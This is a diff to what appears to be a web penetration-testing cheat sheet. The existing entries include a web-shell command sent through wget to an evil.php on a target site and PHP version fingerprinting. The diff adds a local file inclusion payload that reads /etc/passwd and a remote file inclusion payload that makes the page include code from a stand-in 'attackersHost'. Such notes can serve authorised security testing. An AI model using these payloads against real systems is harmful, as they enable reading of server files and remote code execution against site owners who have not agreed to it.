@@ -67,6 +67,11 @@ wget -O output -o /dev/null www.target.com/photos/evil.php?cmd=$(echo ifconfig|b
 cat output
 ------------------------------------------------------------------------------------------------------
 
+# Local file inclusion
+
+http://localhost/index.php?page=/etc/passwd
+------------------------------------------------------------------------------------------------------
+
 # PHP version
 
 telnet <target IP> 80
@@ -75,6 +80,11 @@ GET / HEAD/1.0
 http://target IP/aaaaa.php
 
 Firefox > Web Developer Toolbar > Information > View Response Headers
+------------------------------------------------------------------------------------------------------
+
+# Remote file inclusion
+
+http://localhost/index.php?page=http://attackersHost/evil.txt
 ------------------------------------------------------------------------------------------------------
 
 # TRACE / TRACK methods allowed
